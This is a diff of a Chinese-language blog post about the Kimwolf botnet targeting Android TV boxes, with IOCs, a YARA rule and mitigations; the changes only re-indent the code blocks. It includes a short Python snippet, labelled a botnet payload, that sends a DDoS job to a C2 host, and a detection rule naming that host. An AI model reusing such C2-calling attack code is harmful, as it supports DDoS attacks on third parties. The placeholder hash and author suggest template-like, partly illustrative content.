@@ -27,23 +27,25 @@ categories: [security]
 * **Payload 建構邏輯**:
 
     ```
-    
-    python
-    import requests
-    
-    # Kimwolf Botnet Payload
-    payload = {
-        'type': 'ddos',
-        'target': 'https://example.com',
-        'duration': 3600
-    }
-    
-    # 發送 Payload 到 C2 伺服器
-    response = requests.post('https://c2.kimwolf.net/payload', json=payload)
-    
-    # 執行 DDoS 攻擊
-    if response.status_code == 200:
-        print('DDoS 攻擊發送成功')
+        
+        python
+        import requests
+        
+        # Kimwolf Botnet Payload
+        payload = {
+            'type': 'ddos',
+            'target': 'https://example.com',
+            'duration': 3600
+        }
+        
+        # 發送 Payload 到 C2 伺服器
+        response = requests.post('https://c2.kimwolf.net/payload', json=payload)
+        
+        # 執行 DDoS 攻擊
+        if response.status_code == 200:
+            print('DDoS 攻擊發送成功')
+        
+        
     
     ```
 * **繞過技術**: 攻擊者可以使用 `eBPF` 技術，繞過 Android TV Streaming Box 的安全機制，實現遠端控制。
@@ -53,24 +55,27 @@ categories: [security]
 * **IOCs (入侵指標)**:
 
 | Hash | IP | Domain | File Path |
+
 | --- | --- | --- | --- |
 
 | 1234567890abcdef | 93.95.112.59 | kimwolf.net | /usr/bin/proxy |
 * **偵測規則 (Detection Rules)**:
 
     ```
-    
-    yara
-    rule Kimwolf_Botnet {
-        meta:
-            description = "Kimwolf Botnet Payload"
-            author = "Your Name"
-        strings:
-            $a = "ddos"
-            $b = "https://c2.kimwolf.net/payload"
-        condition:
-            all of them
-    }
+        
+        yara
+        rule Kimwolf_Botnet {
+            meta:
+                description = "Kimwolf Botnet Payload"
+                author = "Your Name"
+            strings:
+                $a = "ddos"
+                $b = "https://c2.kimwolf.net/payload"
+            condition:
+                all of them
+        }
+        
+        
     
     ```
 * **緩解措施**: 更新 Android TV Streaming Box 的 `factory installed` 軟體版本，關閉 `proxy` 軟體，並設定 `nginx.conf` 限制 `DDoS` 攻擊。
@@ -85,5 +90,4 @@ categories: [security]
 
 * [原始報告](https://krebsonsecurity.com/2026/01/who-benefited-from-the-aisuru-and-kimwolf-botnets/)
 * [MITRE ATT&CK](https://attack.mitre.org/techniques/T1499/)
-
 
